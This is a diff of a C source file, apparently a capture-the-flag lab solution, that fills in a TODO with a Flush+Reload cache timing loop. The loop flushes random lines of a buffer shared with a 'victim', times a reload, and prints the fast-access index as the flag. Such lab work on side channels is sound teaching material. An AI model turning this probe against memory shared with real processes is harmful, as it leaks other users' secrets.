@@ -5,20 +5,27 @@
 #include <sys/stat.h>
 #include <sys/mman.h>
 #include <unistd.h>
+#include <time.h>
 
 #include "util.h"
 
-
+#define THRESHOLD 100
 int main() {
-    int flag = -1;
-
-    // buf is shared between the attacker and the victim
+    srand(time(NULL));
+    int i;
     char *buf = allocate_shared_buffer();
 
-    // [2.1] TODO: Put your capture-the-flag code here
+    while(1){
+        i = rand()%1024;
+        uint64_t probe_addr = (uint64_t)buf + i * 128;
+        clflush(probe_addr);
 
-    printf("Flag: %d\n", flag);
-
+        for (int j = 0; j < 300; j++);
+        uint64_t access_time = measure_one_block_access_time(probe_addr);
+        //printf("Address %d access time: %lu\n", i, access_time);
+        if (access_time < THRESHOLD)break;
+    }
+    printf("Flag: %d\n", i);
     deallocate_shared_buffer(buf);
     return 0;
 }
